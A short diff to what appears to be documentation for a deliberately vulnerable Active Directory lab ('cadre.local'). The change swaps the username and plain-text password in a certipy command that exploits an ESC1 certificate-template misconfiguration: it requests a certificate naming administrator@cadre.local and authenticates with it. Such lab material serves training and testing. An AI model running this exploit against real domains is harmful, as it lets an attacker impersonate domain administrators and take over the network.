@@ -3275,7 +3275,7 @@ AD CS is deployed on dc01 with **12 in-scope ESC misconfigurations**. Each explo
 
 ```bash
 # Live template names are CADRE-ESC* (see adcs-configuration-guide.md)
-certipy req -u analyst_cloud@cadre.local -p 'Cl0ud_An@lyst!' -ca cadre-CA \
+certipy req -u chief_command@cadre.local -p 'C0mm@nd_Ch1ef!' -ca cadre-CA \
   -target dc01.cadre.local -template CADRE-ESC1 -upn administrator@cadre.local -dc-ip 192.168.77.10
 certipy auth -pfx administrator.pfx -dc-ip 192.168.77.10 -domain cadre.local
 ```
